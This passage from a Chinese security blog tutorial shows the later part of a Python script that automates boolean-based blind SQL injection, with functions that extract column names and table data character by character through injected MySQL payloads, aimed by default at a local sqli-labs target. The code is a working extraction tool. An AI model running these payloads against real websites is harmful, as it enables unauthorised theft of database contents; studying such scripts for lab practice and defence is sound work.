%23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            <span class="comment"># c 表示在ascii码中33～126位可显示字符</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,a,b,c))</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                    table +=<span class="built_in">chr</span>(c)</span><br><span class="line">                    <span class="built_in">print</span>(table)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#把获取到的表名加入DBTables</span></span><br><span class="line">        DBTables.append(table)</span><br><span class="line">        <span class="comment">#清空table,用来继续获取下一个表名</span></span><br><span class="line">        table = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取数据库表名的效果如下：</p>
+<p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/39175f1bef985138e98578aecefef86f.png" alt="image-20211019180205979"></p>
+<p>根据上面获取到的数据库名，表名，接着来获取表的字段。并把结果以列表的形式存入DBColumns</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取数据库表字段的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBColumns</span>(<span class="params">url,dbname,dbtable</span>):</span></span><br><span class="line">    <span class="keyword">global</span> DBColumns</span><br><span class="line">    <span class="comment">#存放字段数量的变量</span></span><br><span class="line">    DBColumnCount = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取&#123;0&#125;数据表的字段数：&quot;</span>.<span class="built_in">format</span>(dbtable))</span><br><span class="line">    <span class="keyword">for</span> DBColumnCount <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27; and if((select count(column_name) from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27;)=&#123;2&#125;,1,0) %23&quot;</span></span><br><span class="line">        targetUrl = url + payload</span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,dbtable,DBColumnCount))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-]&#123;0&#125; 数据表的字段数为：&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(dbtable,DBColumnCount))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">     <span class="comment">#开始获取字段的名称</span></span><br><span class="line">     <span class="comment">#保存字段名的临时变量</span></span><br><span class="line">    column = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># a 表示当前获取字段的索引</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,DBColumnCount):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]正在获取第&#123;0&#125; 个字段名&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#先获取字段的长度</span></span><br><span class="line">        <span class="keyword">for</span> columnLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if((select length(column_name) from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27; limit &#123;2&#125;,1)=&#123;3&#125;,1,0) %23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,dbtable,a,columnLen))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#b表示当前字段名猜解的位置</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,columnLen+<span class="number">1</span>):</span><br><span class="line">                payload = <span class="string">&quot;&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27; limit &#123;2&#125;,1),&#123;3&#125;,1))=&#123;4&#125;,1,0) %23&quot;</span></span><br><span class="line">                targetUrl = url + payload</span><br><span class="line">                <span class="comment">#c 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                    res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,dbtable,a,b,c))</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                        column += <span class="built_in">chr</span>(c)</span><br><span class="line">                        <span class="built_in">print</span>(column)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="comment">#把获取到的字段加入DBCloumns</span></span><br><span class="line">        DBColumns.append(column)</span><br><span class="line">        <span class="comment">#清空column，用来继续获取下一个字段名</span></span><br><span class="line">        column = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取表的字段效果如下：</p>
+<p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/91e7ffba24b009d1093b048b2d5e0e5f.png" alt="image-20211019180352627"></p>
+<p>然后，就可以获取到数据了。根据获取的URL，数据库表名和数据表字段来获取数据。数据以字典形式存放，键为字段名，值为数据形成的列表。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取表字段的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBData</span>(<span class="params">url,dbtable,dbcolumn</span>):</span></span><br><span class="line">    <span class="keyword">global</span> DBData</span><br><span class="line">    <span class="comment">#先获取字段的数据数量</span></span><br><span class="line">    DBDataCount = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始获取 &#123;0&#125; 表 &#123;1&#125; 字段的数据数量&quot;</span>.<span class="built_in">format</span>(dbtable,dbcolumn))</span><br><span class="line">    <span class="keyword">for</span> DBDataCount <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27; and if((select count(&#123;0&#125;) from &#123;1&#125;)=&#123;2&#125;,1,0) %23&quot;</span></span><br><span class="line">        targetUrl = url + payload</span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(dbcolumn,dbtable,DBDataCount))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-]&#123;0&#125;表&#123;1&#125;字段的数据数量为：&#123;2&#125;&quot;</span>.<span class="built_in">format</span>(dbtable,dbcolumn,DBDataCount))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,DBDataCount):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 正在获取&#123;0&#125; 的 第&#123;1&#125; 个数据&quot;</span>.<span class="built_in">format</span>(dbcolumn,a+<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#先获取这个数据的长度</span></span><br><span class="line">        dataLen = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> dataLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if((select length(&#123;0&#125;) from &#123;1&#125; limit &#123;2&#125;,1)=&#123;3&#125;,1,0) %23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(dbcolumn,dbtable,a,dataLen))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-]第&#123;0&#125;个数据长度为：&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>,dataLen))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#临时存放数据内容变量</span></span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">#开始获取数据具体内容</span></span><br><span class="line">        <span class="comment">#b表示当前数据内容的猜解的位置</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,dataLen+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                payload = <span class="string">&quot;&#x27; and if (ascii(substr((select &#123;0&#125; from &#123;1&#125; limit &#123;2&#125;,1),&#123;3&#125;,1))=&#123;4&#125;,1,0) %23&quot;</span></span><br><span class="line">                targetUrl = url + payload</span><br><span class="line">                res = conn.get(targetUrl.<span class="built_in">format</span>(dbcolumn,dbtable,a,b,c))</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                    data +=<span class="built_in">chr</span>(c)</span><br><span class="line">                    <span class="built_in">print</span>(data)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#放到以字段名为健，值为列表的字典中</span></span><br><span class="line">        DBData.setdefault(dbcolumn,[]).append(data)</span><br><span class="line">        <span class="built_in">print</span>(DBData)</span><br><span class="line">        <span class="comment">#把data清空，继续获取下一个数据</span></span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取数据的效果如下：</p>
+<p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/19a5856b78f5379fbce8de4210aab214.png" alt="image-20211019180638366"></p>
+<p>最后，编写主函数，传入URL</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#入口，主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = optparse.OptionParser(<span class="string">&#x27;usage: python %prog -u url \n\n&#x27;</span> <span class="string">&#x27;Example: python %prog -u http://127.0.0.1/sql/Less-8/?id=1\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#目标URL参数 -u</span></span><br><span class="line">    parser.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,dest=<span class="string">&#x27;targetURL&#x27;</span>,default=<span class="string">&#x27;http://127.0.0.1/sql/Less-8/?id=1&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target URL&#x27;</span>)</span><br><span class="line">    (options,args) = parser.parse_args()</span><br><span class="line">    StartSqli(options.targetURL)</span><br></pre></td></tr></table></figure>
+
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>关于盲注的自动化脚本就写这么多，如有错误请斧正。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+<div class="wechat_OA">
+	<span>欢迎关注我的公众号</span>
+	<br>
+    <!-- 这里添加你的二维码图片 -->
+	<img src ="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/b96183f757001d225f8ec44f8e9e9df2.jpg">
+</div>
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>小艾
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://lxflxfcl.github.io/2021/10/05/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" title="用python写一个自动化盲注脚本">https://lxflxfcl.github.io/2021/10/05/用python写一个自动化盲注脚本/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/03/hello-world/" rel="prev" title="Hello World">
+                  <i class="fa fa-chevron-left"></i> Hello World
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/10/05/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="next" title="博客园漏洞挖掘">
+                  博客园漏洞挖掘 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+    <div class="theme-info">
+      <div class="powered-by"></div>
+      <span class="post-count">博客全站共3.1k字</span>
+    </div>
+
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
